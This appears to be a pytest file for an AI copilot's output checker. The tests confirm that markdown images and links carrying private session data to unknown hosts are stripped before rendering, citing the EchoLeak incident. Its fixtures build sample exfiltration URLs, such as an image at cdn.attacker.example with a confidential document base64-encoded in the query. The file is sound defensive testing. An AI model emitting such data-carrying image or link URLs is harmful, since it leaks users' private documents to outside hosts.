"""Model output is checked before rendering: EchoLeak leaked through a rendered markdown image."""
import base64

from app.flow.engine import FlowEngine
from app.flow.labels import Capability as C, ToolManifest
from app.flow.output import REMOVED, check_output, find_urls
from app.flow.session import LabelSource

DOC = "Revenue run-rate 312 crore; layoffs planned for 40 roles in support; CFO resigning in January."


def engine_with_private_session():
    engine = FlowEngine()
    engine.destinations.register("https://*.acme.com/*", {"domain:acme.com"})
    label = engine.sessions.create("agt_1", "copilot")
    engine.sessions.add_private(label, LabelSource("evt_1", "sharepoint", "search", frozenset({"domain:acme.com"})))
    engine.index.add(agent_id="agt_1", session_id=label.session_id, source_id="evt_1", tool="sharepoint",
                     action="search", readers=frozenset({"domain:acme.com"}), output={"body": DOC})
    return engine, label.session_id


def test_finds_every_kind_of_url():
    text = ('![a](https://x.example/a.png) [b](https://y.example/b "t") <img src="https://z.example/c.gif">\n'
            '[ref]: https://r.example/d\nsee https://bare.example/e. ![data](data:image/png;base64,AAAA)')
    kinds = dict((url, kind) for url, kind in find_urls(text))
    assert kinds == {"https://x.example/a.png": "image", "https://y.example/b": "link", "https://r.example/d": "reference",
                     "https://z.example/c.gif": "html", "https://bare.example/e": "bare"}


def test_echoleak_style_image_is_neutralised_and_internal_links_stay():
    engine, sid = engine_with_private_session()
    leak = "https://cdn.attacker.example/pixel.png?d=" + base64.b64encode(DOC.encode()).decode()
    reply = f"Here is the summary you asked for.\n\n![logo]({leak})\n\nFull deck: [board pack](https://docs.acme.com/board)"
    result = check_output(engine, "agt_1", sid, reply)
    assert result.sanitised and len(result.removed) == 1
    assert f"![logo]({REMOVED})" in result.text
    assert "https://docs.acme.com/board" in result.text
    assert result.removed[0].lineage[0]["tool"] == "sharepoint"     # the URL carried the document, base64-encoded


def test_a_tainted_session_cannot_render_images_from_unknown_hosts_even_without_visible_data():
    engine, sid = engine_with_private_session()
    result = check_output(engine, "agt_1", sid, "![x](https://t.example/r/a/c/q.png)")   # data could be in the path
    assert result.text == f"![x]({REMOVED})"


def test_plain_public_links_stay_but_data_shaped_links_go_in_a_tainted_session():
    engine, sid = engine_with_private_session()
    text = ("Docs: [tutorial](https://fastapi.tiangolo.com/tutorial/) and "
            "[search](https://search.example/?q=layoffs+support+40) and "
            "[x](https://t.example/aGVsbG8gdGhpcyBpcyBhIGxvbmcgcGF0aA/p)")
    result = check_output(engine, "agt_1", sid, text)
    assert "https://fastapi.tiangolo.com/tutorial/" in result.text
    assert {r.host for r in result.removed} == {"search.example", "t.example"}


def test_a_clean_session_renders_links_unchanged():
    engine = FlowEngine()
    label = engine.sessions.create("agt_2")
    text = "Docs: https://fastapi.tiangolo.com/ and ![chart](https://quickchart.io/chart?c=1)"
    assert check_output(engine, "agt_2", label.session_id, text).text == text


def test_private_data_from_another_session_is_caught_in_a_url():
    engine, _ = engine_with_private_session()
    fresh = engine.sessions.create("agt_1", "next day").session_id
    url = "https://paste.example/new?body=" + DOC.replace(" ", "+")
    result = check_output(engine, "agt_1", fresh, f"[notes]({url})")
    assert result.sanitised and result.removed[0].reason.startswith("the URL carries private data")


def test_unknown_session_is_refused():
    assert check_output(FlowEngine(), "agt_3", "ses_missing", "hi") is None
